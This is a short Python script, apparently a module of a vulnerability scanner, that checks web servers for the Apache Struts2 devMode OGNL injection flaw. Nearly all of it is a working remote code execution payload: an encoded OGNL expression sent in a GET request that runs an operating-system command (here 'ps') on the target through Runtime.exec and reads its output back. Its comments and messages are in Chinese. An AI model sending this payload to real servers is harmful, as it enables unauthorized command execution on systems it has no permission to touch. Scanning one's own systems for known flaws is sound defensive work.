# -*- encoding: utf-8 -*-
'''
@File : s2_dev.py
@Time : 2019/08/03 22:10:40
@Author : JE2Se 
@Version : 1.0
@Contact : admin@je2se.com
@WebSite : https://www.je2se.com
'''



import requests
from lib import *
import sys

def s2_dev(url):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    exp = '''?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=ps'''
    url += exp
    try:
        resp = requests.get(url, headers=headers, timeout=10)
        if "PID" in resp.text:
            print(Vcolors.RED +"存在S2-dev漏洞~"+ Vcolors.ENDC)
        else:
            print(Vcolors.OKGREEN +"不存在S2-dev漏洞~"+ Vcolors.ENDC)
    except:
        print(Vcolors.OKGREEN +"不存在S2-dev漏洞~"+ Vcolors.ENDC)